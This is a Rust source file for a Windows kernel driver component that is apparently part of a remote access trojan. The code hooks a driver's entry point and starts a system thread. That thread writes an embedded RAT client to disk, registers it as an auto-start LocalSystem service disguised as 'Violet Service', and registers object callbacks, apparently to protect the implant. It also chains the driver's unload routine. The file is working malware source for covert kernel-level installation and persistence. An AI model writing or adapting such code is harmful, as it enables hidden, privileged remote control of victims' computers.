use core::ffi::c_void;
use core::sync::atomic::{AtomicPtr, Ordering};
use core::{mem, ptr};

use rat_common::utils::DropGuard;
use wdk::{self, nt_success};
use wdk_sys::_MODE::KernelMode;
use wdk_sys::ntddk::{
    KeDelayExecutionThread, ObUnRegisterCallbacks, PsCreateSystemThread, RtlInitUnicodeString,
    ZwClose, ZwCreateKey,
};
use wdk_sys::{
    HANDLE, KEY_ALL_ACCESS, LARGE_INTEGER, NTSTATUS, OBJ_CASE_INSENSITIVE, OBJ_KERNEL_HANDLE,
    OBJECT_ATTRIBUTES, PDRIVER_OBJECT, REG_EXPAND_SZ, REG_OPTION_NON_VOLATILE, REG_SZ,
    SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, SERVICE_WIN32_OWN_PROCESS, THREAD_ALL_ACCESS,
    UNICODE_STRING,
};
use widestring::{U16CStr, Utf16Str, u16cstr};

use crate::global::{
    MAX_INITIALIZE_ATTEMPTS, RAT_CLIENT, RAT_CLIENT_OBJ_PATH, RAT_CLIENT_SERVICE_PATH,
    SERVICE_REGISTRY,
};
use crate::handlers::object;
use crate::wrappers::bindings::InitializeObjectAttributes;
use crate::wrappers::{fs, registry};
use crate::{error, info};

type DriverUnloadFn = unsafe extern "C" fn(driver: PDRIVER_OBJECT);

unsafe extern "C" fn initialize_thread_routine(driver: *mut c_void) {
    let driver = driver.cast();
    let mut sleep = LARGE_INTEGER { QuadPart: -3000000 };
    for _ in 0..MAX_INITIALIZE_ATTEMPTS {
        let status = unsafe { KeDelayExecutionThread(KernelMode as i8, 0, &mut sleep) };
        if !nt_success(status) {
            error!("KeDelayExecutionThread failed: 0x{status:X}");
            break;
        }

        if initialize(driver).is_ok() {
            break;
        }
    }

    error!("Failed to initialize after {MAX_INITIALIZE_ATTEMPTS} attempts");
}

fn setup_service_registry(path: &U16CStr) -> anyhow::Result<()> {
    let mut attributes = OBJECT_ATTRIBUTES::default();
    let mut root_directory = UNICODE_STRING::default();
    unsafe {
        RtlInitUnicodeString(&mut root_directory, SERVICE_REGISTRY.as_ptr());
        InitializeObjectAttributes(
            &mut attributes,
            &mut root_directory,
            OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
            ptr::null_mut(),
            ptr::null_mut(),
        );
    }

    let mut key = HANDLE::default();
    let status = unsafe {
        ZwCreateKey(
            &mut key,
            KEY_ALL_ACCESS,
            &mut attributes,
            0,
            ptr::null_mut(),
            REG_OPTION_NON_VOLATILE,
            ptr::null_mut(),
        )
    };
    anyhow::ensure!(nt_success(status), "ZwCreateKey failed: 0x{status:X}");

    let guard = DropGuard::new(key, |key| unsafe {
        let _ = ZwClose(key);
    });

    // Reference: https://learn.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree
    for status in [
        registry::registry_write_string(
            key,
            u16cstr!("DisplayName"),
            u16cstr!("Violet Service"),
            REG_SZ,
        ),
        registry::registry_write_string(
            key,
            u16cstr!("Description"),
            u16cstr!("Violet Service"),
            REG_SZ,
        ),
        registry::registry_write_string(key, u16cstr!("ImagePath"), path, REG_EXPAND_SZ),
        registry::registry_write_dword(key, u16cstr!("Type"), SERVICE_WIN32_OWN_PROCESS),
        registry::registry_write_dword(key, u16cstr!("Start"), SERVICE_AUTO_START),
        registry::registry_write_dword(key, u16cstr!("ErrorControl"), SERVICE_ERROR_NORMAL),
        registry::registry_write_string(
            key,
            u16cstr!("ObjectName"),
            u16cstr!("LocalSystem"),
            REG_SZ,
        ),
    ] {
        anyhow::ensure!(nt_success(status), "ZwSetValueKey failed: 0x{status:X}");
    }

    drop(guard);
    Ok(())
}

fn drop_file() -> anyhow::Result<()> {
    let file = fs::File::create(RAT_CLIENT_OBJ_PATH.as_ptr())?;
    file.write(RAT_CLIENT)?;

    Ok(())
}

fn initialize(driver: PDRIVER_OBJECT) -> anyhow::Result<()> {
    let mut success = true;
    match drop_file() {
        Ok(_) => match setup_service_registry(RAT_CLIENT_SERVICE_PATH) {
            Ok(_) => info!("Service registry setup successfully"),
            Err(e) => {
                success = false;
                error!("Failed to setup service registry: {e}");
            }
        },
        Err(e) => {
            error!("Failed to drop RAT client: {e}");
            success = false;
        }
    }

    match object::ob_register_callbacks() {
        Ok(handle) => {
            info!("Register object callbacks successfully");

            if let Some(driver) = unsafe { driver.as_mut() } {
                static HANDLE: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
                HANDLE.store(handle, Ordering::Release);

                static CURRENT_DRIVER_UNLOAD: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());
                if let Some(unload) = driver.DriverUnload {
                    CURRENT_DRIVER_UNLOAD.store(unload as *mut u8, Ordering::Release);
                }

                driver.DriverUnload = Some(driver_unload);

                unsafe extern "C" fn driver_unload(driver: PDRIVER_OBJECT) {
                    let old_driver_unload_ptr = CURRENT_DRIVER_UNLOAD.load(Ordering::Acquire);
                    if !old_driver_unload_ptr.is_null() {
                        unsafe {
                            let old_driver_unload =
                                mem::transmute::<*mut u8, DriverUnloadFn>(old_driver_unload_ptr);
                            old_driver_unload(driver);
                        }
                    }

                    let handle = HANDLE.load(Ordering::Acquire);
                    unsafe {
                        ObUnRegisterCallbacks(handle);
                    }
                }
            }
        }
        Err(e) => {
            success = false;
            error!("Failed to register object callbacks: {e}");
        }
    }

    anyhow::ensure!(success, "At least 1 initialization routine failed");
    Ok(())
}

pub fn driver_entry_prehook(
    driver: PDRIVER_OBJECT,
    registry_path: Option<&Utf16Str>,
) -> anyhow::Result<()> {
    info!("DriverEntry: {driver:p}, {registry_path:?}");
    let mut thread = ptr::null_mut();

    let status = unsafe {
        PsCreateSystemThread(
            &mut thread,
            THREAD_ALL_ACCESS,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            Some(initialize_thread_routine),
            driver.cast(),
        )
    };
    anyhow::ensure!(
        nt_success(status),
        "PsCreateSystemThread failed: 0x{status:X}",
    );

    Ok(())
}

pub fn driver_entry_posthook(
    _: PDRIVER_OBJECT,
    _: Option<&Utf16Str>,
    status: NTSTATUS,
) -> anyhow::Result<()> {
    info!("Original DriverEntry returned with status: 0x{status:X}");
    Ok(())
}
